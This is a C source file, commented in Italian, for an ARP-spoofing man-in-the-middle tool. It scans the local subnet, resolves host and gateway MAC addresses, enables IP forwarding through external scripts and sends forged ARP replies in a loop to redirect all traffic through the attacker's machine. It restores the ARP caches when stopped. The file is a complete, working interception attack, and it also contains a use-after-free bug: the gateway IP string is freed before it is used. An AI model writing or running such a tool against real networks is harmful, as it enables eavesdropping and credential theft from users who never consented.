#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <sys/wait.h>

// ============================================================
// STATO GLOBALE
// ============================================================

static char            ip_buffer[4096];
static size_t          off = 0;
static pthread_mutex_t buf_mutex = PTHREAD_MUTEX_INITIALIZER;

// Cache degli host risolti: IP + MAC già noti.
struct host {
    uint8_t ip[4];
    uint8_t mac[6];
};
static struct host hosts[256];
static int         n_hosts = 0;

static int      sock = -1;
static char    *iface = NULL;
static uint8_t  my_mac[6], my_ip[4];
static uint8_t  gw_mac[6], gw_ip[4];

static volatile int running = 1;

#define START_SCRIPT "FORWARDING/start_mitm.sh"
#define STOP_SCRIPT  "FORWARDING/stop_mitm.sh"

// ============================================================
// STRUTTURE
// ============================================================

struct frame {
    uint8_t  eth_dst[6], eth_src[6];
    uint16_t eth_type;
    uint16_t arp_htype, arp_ptype;
    uint8_t  arp_hlen, arp_plen;
    uint16_t arp_oper;
    uint8_t  arp_sha[6], arp_spa[4], arp_tha[6], arp_tpa[4];
} __attribute__((packed));

// ============================================================
// UTILITY
// ============================================================

static char* convert_mac(const uint8_t *m) {
    char *buf;
    if (asprintf(&buf, "%02x:%02x:%02x:%02x:%02x:%02x",
                 m[0], m[1], m[2], m[3], m[4], m[5]) < 0)
        return NULL;
    return buf;
}

// Thread-safe: usa inet_ntop con buffer locale, non inet_ntoa
static char* convert_ip(const uint8_t *ip) {
    struct in_addr a;
    char tmp[INET_ADDRSTRLEN];
    memcpy(&a, ip, 4);
    inet_ntop(AF_INET, &a, tmp, sizeof(tmp));
    char *buf;
    if (asprintf(&buf, "%s", tmp) < 0) return NULL;
    return buf;
}

static void on_sigint(int sig) {
    (void)sig;
    running = 0;
}

// ============================================================
// INFO DI RETE
// ============================================================

static int get_iface_mac(const char *ifname, uint8_t *out) {
    char path[128];
    snprintf(path, sizeof(path), "/sys/class/net/%s/address", ifname);
    FILE *f = fopen(path, "r");
    if (!f) return -1;
    unsigned int m[6];
    int n = fscanf(f, "%x:%x:%x:%x:%x:%x",
                   &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]);
    fclose(f);
    if (n != 6) return -1;
    for (int i = 0; i < 6; i++) out[i] = (uint8_t)m[i];
    return 0;
}

static int get_iface_ip(const char *ifname, uint8_t *out) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return -1;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) { close(s); return -1; }
    close(s);
    struct sockaddr_in *sin = (struct sockaddr_in *)&ifr.ifr_addr;
    memcpy(out, &sin->sin_addr, 4);
    return 0;
}

// ============================================================
// IP FORWARDING
// ============================================================

static int avvia_ipForwarding(void) {
    int ret = system("sh " START_SCRIPT);
    if (ret == -1) {
        perror("system start_mitm");
        return -1;
    }
    if (!WIFEXITED(ret) || WEXITSTATUS(ret) != 0) {
        fprintf(stderr, "start_mitm.sh fallito (ret=%d)\n", ret);
        return -1;
    }
    return 0;
}

static int ferma_ipForwarding(void) {
    int ret = system("sh " STOP_SCRIPT);
    if (ret == -1) {
        perror("system stop_mitm");
        return -1;
    }
    if (!WIFEXITED(ret) || WEXITSTATUS(ret) != 0) {
        fprintf(stderr, "stop_mitm.sh fallito (ret=%d)\n", ret);
        return -1;
    }
    return 0;
}

// ============================================================
// PRIMITIVE ARP
// ============================================================

static void send_arp(uint8_t *eth_dst, uint8_t *sha, uint8_t *spa,
                     uint8_t *tha,     uint8_t *tpa, uint16_t op) {
    struct frame f;
    memset(&f, 0, sizeof(f));

    if (eth_dst) memcpy(f.eth_dst, eth_dst, 6);
    if (sha)     memcpy(f.eth_src, sha, 6);
    f.eth_type  = htons(ETH_P_ARP);

    f.arp_htype = htons(1);
    f.arp_ptype = htons(0x0800);
    f.arp_hlen  = 6;
    f.arp_plen  = 4;
    f.arp_oper  = htons(op);

    if (sha) memcpy(f.arp_sha, sha, 6);
    if (spa) memcpy(f.arp_spa, spa, 4);
    if (tha) memcpy(f.arp_tha, tha, 6);
    if (tpa) memcpy(f.arp_tpa, tpa, 4);

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family   = AF_PACKET;
    sa.sll_protocol = htons(ETH_P_ARP);
    sa.sll_ifindex  = if_nametoindex(iface);
    sa.sll_halen    = 6;
    if (eth_dst) memcpy(sa.sll_addr, eth_dst, 6);

    sendto(sock, &f, sizeof(f), 0, (struct sockaddr *)&sa, sizeof(sa));
}

// ARP request per 'ip', aspetta reply, riempe 'out_mac'.
// Ritorna 0 se ok, -1 se timeout.
static int get_mac(uint8_t *ip, uint8_t *out_mac) {
    uint8_t bcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    send_arp(bcast, my_mac, my_ip, NULL, ip, 1);

    uint8_t buf[1024];
    while (recv(sock, buf, sizeof(buf), 0) >= 42) {
        struct frame *f = (struct frame *)buf;
        if (ntohs(f->eth_type) == ETH_P_ARP &&
            ntohs(f->arp_oper) == 2 &&
            memcmp(f->arp_spa, ip, 4) == 0) {
            memcpy(out_mac, f->arp_sha, 6);
            return 0;
        }
    }
    return -1;
}

// Invia un ARP reply: "host_ip è a host_mac", al target
static void poison(uint8_t *target_mac, uint8_t *target_ip,
                   uint8_t *host_ip,    uint8_t *host_mac) {
    send_arp(target_mac, host_mac, host_ip, target_mac, target_ip, 2);
}

// Avvelena la cache ARP per un singolo host (MAC già noto dalla cache).
static void arpPoisoner(struct host *h) {
    // 1) al target: "il gateway è al mio MAC"
    poison(h->mac, h->ip, gw_ip,  my_mac);
    // 2) al gateway: "il target è al mio MAC"
    poison(gw_mac, gw_ip, h->ip,  my_mac);
}

// Ripristina la cache ARP per un singolo host (MAC reali).
static void arpRestorer(struct host *h) {
    // 7 pacchetti per essere sicuri che il target li riceva tutti
    for (int i = 0; i < 7; i++) {
        // 1) al target: "il gateway è al MAC VERO del gateway"
        poison(h->mac, h->ip, gw_ip,  gw_mac);
        // 2) al gateway: "il target è al MAC VERO del target"
        poison(gw_mac, gw_ip, h->ip,  h->mac);
        usleep(200000); // 200 ms
    }
}

// ============================================================
// SCANNER (ping-based)
// ============================================================

static int isAlive(const char *ip) {
    char command[256];
    snprintf(command, sizeof(command),
             "ping -c 1 -W 1 %s > /dev/null 2>&1", ip);
    FILE *fp = popen(command, "r");
    if (!fp) return 0;
    int status = pclose(fp);
    return (status == 0) ? 1 : 0;
}

static void* zombie(void* arg) {
    char *ip = (char*)arg;
    if (isAlive(ip)) {
        printf("%s è vivo\n", ip);
        fflush(stdout);

        pthread_mutex_lock(&buf_mutex);
        int n = snprintf(ip_buffer + off, sizeof(ip_buffer) - off,
                         "%s;", ip);
        if (n < 0) {
            fprintf(stderr, "[ERRORE] snprintf fallito\n");
        } else if ((size_t)n >= sizeof(ip_buffer) - off) {
            fprintf(stderr, "[ERRORE CRITICO] buffer IP pieno\n");
        } else {
            off += n;
        }
        pthread_mutex_unlock(&buf_mutex);
    }
    free(ip);
    return NULL;
}

static void scan_subnet(void) {
    uint8_t base[4];
    memcpy(base, my_ip, 4);

    const int BATCH = 50;
    pthread_t threads[BATCH];
    int n = 0;

    for (int i = 1; i <= 254; i++) {
        base[3] = i;
        if (memcmp(base, my_ip, 4) == 0) continue;

        char ip_str[16];
        snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d",
                 base[0], base[1], base[2], base[3]);

        char *arg = strdup(ip_str);
        if (!arg) continue;

        if (pthread_create(&threads[n], NULL, zombie, arg) == 0) {
            n++;
        } else {
            free(arg);
        }

        if (n >= BATCH) {
            for (int j = 0; j < n; j++) pthread_join(threads[j], NULL);
            n = 0;
        }
    }
    for (int i = 0; i < n; i++) pthread_join(threads[i], NULL);
}

// ============================================================
// CACHE HOST
// ============================================================

static void build_host_cache(void) {
    n_hosts = 0;

    pthread_mutex_lock(&buf_mutex);
    char *copy = strdup(ip_buffer);
    pthread_mutex_unlock(&buf_mutex);
    if (!copy) return;

    char *p = copy;
    char *ip;


    struct timeval tv = {3, 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    while ((ip = strsep(&p, ";")) != NULL) {
        if (*ip == '\0') continue;
        if (n_hosts >= 256) break;

        uint8_t tgt_ip[4];
        if (inet_pton(AF_INET, ip, tgt_ip) != 1) continue;

        uint8_t tgt_mac[6];
        if (get_mac(tgt_ip, tgt_mac) < 0) {
            fprintf(stderr, "[CACHE] %s non risponde ad ARP, salto\n", ip);
            continue;
        }

        memcpy(hosts[n_hosts].ip,  tgt_ip,  4);
        memcpy(hosts[n_hosts].mac, tgt_mac, 6);
        n_hosts++;
    }
    free(copy);

    printf("[CACHE] %d host con MAC risolto\n", n_hosts);
}

// ============================================================
// PROCESS / RESTORE
// ============================================================

static void process_ips(void) {
    for (int i = 0; i < n_hosts; i++) {
        arpPoisoner(&hosts[i]);
    }
}

static void restore_ips(void) {
    for (int i = 0; i < n_hosts; i++) {
        arpRestorer(&hosts[i]);
    }
}

static int flush_arp_cache(const char *iface) {
    char cmd[128];
    // Se iface è NULL, flusha tutta la cache; altrimenti solo quella dell'interfaccia
    if (iface)
        snprintf(cmd, sizeof(cmd), "ip neigh flush dev %s", iface);
    else
        snprintf(cmd, sizeof(cmd), "ip neigh flush all");

    int ret = system(cmd);
    if (ret == -1) {
        perror("system ip neigh flush");
        return -1;
    }
    if (!WIFEXITED(ret) || WEXITSTATUS(ret) != 0) {
        fprintf(stderr, "ip neigh flush fallito (ret=%d)\n", ret);
        return -1;
    }
    return 0;
}

static void riscalda_arp(const char *iface, const char *gateway_ip) {
    // Pinging del gateway forza la risoluzione ARP
    char cmd[256];
    snprintf(cmd, sizeof(cmd),
             "ping -c 1 -W 2 %s > /dev/null 2>&1", gateway_ip);
    system(cmd);
    // Piccola pausa per lasciare al kernel il tempo di aggiornare la tabella
    usleep(200 * 1000);
}

// ============================================================
// MAIN
// ============================================================

int main(int argc, char **argv) {
    if (argc != 3) {
        fprintf(stderr, "uso: %s <iface> <gateway_ip>   (es. wlan0 192.168.1.1)\n",
                argv[0]);
        return 1;
    }
    iface = argv[1];

    signal(SIGINT, on_sigint);

    // 1) MAC e IP dell'interfaccia
    if (get_iface_mac(iface, my_mac) < 0 ||
        get_iface_ip(iface, my_ip) < 0) {
        fprintf(stderr, "impossibile leggere MAC/IP di %s\n", iface);
        return 1;
    }
    char *my_mac_s = convert_mac(my_mac);
    char *my_ip_s  = convert_ip(my_ip);
    printf("[*] iface=%s  mio MAC=%s  mio IP=%s\n",
           iface, my_mac_s ? my_mac_s : "?", my_ip_s ? my_ip_s : "?");
    free(my_mac_s); free(my_ip_s);

    // 2) Gateway passato come argv[2]
    if (inet_pton(AF_INET, argv[2], gw_ip) != 1) {
        fprintf(stderr, "gateway IP non valido: %s\n", argv[2]);
        return 1;
    }
    char *gw_ip_s = convert_ip(gw_ip);
    printf("[*] gateway IP=%s\n", gw_ip_s ? gw_ip_s : "?");
    free(gw_ip_s);

    riscalda_arp(iface, gw_ip_s);

    // 3) Socket raw
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) { perror("socket"); return 1; }

    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family   = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ALL);
    sll.sll_ifindex  = if_nametoindex(iface);
    if (bind(sock, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
        perror("bind"); return 1;
    }

    struct timeval tv = {2, 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    // 4) MAC del gateway (una volta sola)
    if (get_mac(gw_ip, gw_mac) < 0) {
        fprintf(stderr, "gateway non risponde ad ARP\n");
        return 1;
    }
    char *gw_mac_s = convert_mac(gw_mac);
    printf("[*] gateway MAC=%s\n", gw_mac_s ? gw_mac_s : "?");
    free(gw_mac_s);

    // 5) Scansione subnet
    printf("[*] scansione subnet in corso...\n");
    scan_subnet();
    printf("[*] scan completato. buffer: %s\n",
           off > 0 ? ip_buffer : "(nessun host)");

    if (off == 0) {
        fprintf(stderr, "nessun host online, esco\n");
        close(sock);
        return 1;
    }

    // 6) Risolvi i MAC una volta sola e riempi la cache
    printf("[*] risoluzione MAC degli host...\n");
    build_host_cache();

    if (n_hosts == 0) {
        fprintf(stderr, "nessun host con MAC valido, esco\n");
        close(sock);
        return 1;
    }

    flush_arp_cache(iface);

    avvia_ipForwarding();

    // 7) Loop di poisoning
    printf("[*] avvio loop di poisoning (CTRL+C per fermare)\n");
    while (running) {
        process_ips();
        sleep(2);
    }

    printf("\n[*] stop.\n");

    // 8) Ripristino cache ARP — PRIMA di chiudere il socket
    printf("[*] ripristino cache ARP...\n");
    restore_ips();

    // 9) Ora posso chiudere
    close(sock);

    printf("[*] disattivo IP forwarding...\n");
    ferma_ipForwarding();

    printf("[*] done.\n");
    return 0;
}
